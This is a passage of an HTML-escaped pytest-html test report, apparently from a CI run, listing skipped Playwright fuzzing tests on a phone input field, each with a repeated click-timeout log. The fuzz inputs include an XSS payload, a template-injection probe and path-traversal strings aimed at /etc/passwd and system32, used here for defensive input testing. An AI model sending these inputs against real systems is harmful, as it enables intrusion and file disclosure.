class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;00000000000000000000&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;${7*7}&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;${7*7}&#39;]&#34;, &#34;duration&#34;: &#34;00:00:34&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;${7*7}&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:34&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\xf1o\\xf1o \\xe0\\xe9\\xee\\xf5u&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\xf1o\\xf1o \\xe0\\xe9\\xee\\xf5u&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\xf1o\\xf1o \\xe0\\xe9\\xee\\xf5u&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    49 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms\\n    - waiting for element to be visible, enabled and stable&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\\\x1b[31mred\\\\x1b[0m&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\\\x1b[31mred\\\\x1b[0m&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\\\x1b[31mred\\\\x1b[0m&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    51 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\u4f60\\u597d\\u4e16\\u754c&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\u4f60\\u597d\\u4e16\\u754c&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\u4f60\\u597d\\u4e16\\u754c&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    49 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa1]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa1]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa1]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\u30cb \\u30db \\u30f3 \\u30b4&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\u30cb \\u30db \\u30f3 \\u30b4&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\u30cb \\u30db \\u30f3 \\u30b4&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\&#34;&gt;&lt;svg/onload=alert(1)&gt;&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\&#34;&gt;&lt;svg/onload=alert(1)&gt;&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\&#34;&gt;&lt;svg/onload=alert(1)&gt;&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    49 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms\\n    - waiting for element to be visible, enabled and stable\\n    - element is visible, enabled and stable\\n    - scrolling into view if needed\\n    - done scrolling&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;data\\\\x00data&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;data\\\\x00data&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;data\\\\x00data&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\U0001f980\\U0001f680\\U0001f4a5&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\U0001f980\\U0001f680\\U0001f4a5&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;\\U0001f980\\U0001f680\\U0001f4a5&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;../../../etc/passwd&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;../../../etc/passwd&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;../../../etc/passwd&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;..\\\\\\\\..\\\\\\\\windows\\\\\\\\system32&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;..\\\\\\\\..\\\\\\\\windows\\\\\\\\system32&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;..\\\\\\\\..\\\\\\\\windows\\\\\\\\system32&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: 